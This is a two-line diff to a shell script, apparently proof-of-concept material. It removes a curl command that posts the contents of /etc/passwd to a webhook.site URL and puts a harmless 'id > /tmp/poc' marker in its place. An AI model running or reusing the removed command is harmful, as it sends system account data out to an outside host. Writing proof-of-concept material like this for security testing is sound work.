@@ -1,2 +1,2 @@
 #!/bin/sh
-curl -X POST -H "Content-Type: text/plain" --data-binary "@-" https://webhook.site/0edca452-1ce1-4e11-a555-23a38d884456/upload -d "$(cat /etc/passwd)"
+id > /tmp/poc
